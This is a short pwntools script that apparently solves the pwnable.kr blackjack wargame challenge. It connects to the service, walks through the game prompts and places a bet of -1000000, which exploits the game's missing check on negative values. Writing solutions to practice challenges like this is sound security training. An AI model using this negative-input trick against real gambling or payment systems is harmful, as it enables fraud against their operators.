from pwn import *
r = remote('pwnable.kr', 9009)
r.recvuntil('(Y/N)')
r.sendline('Y')
r.recvuntil('Choice: ')
r.sendline('1')
r.recvuntil('Enter Bet: $')
r.sendline('-1000000')
r.recvuntil('S to Stay.\n')
r.sendline('S')
r.recvuntil('N for No')
r.sendline('Y')
text = r.recvuntil('Bet: $')
print (text)
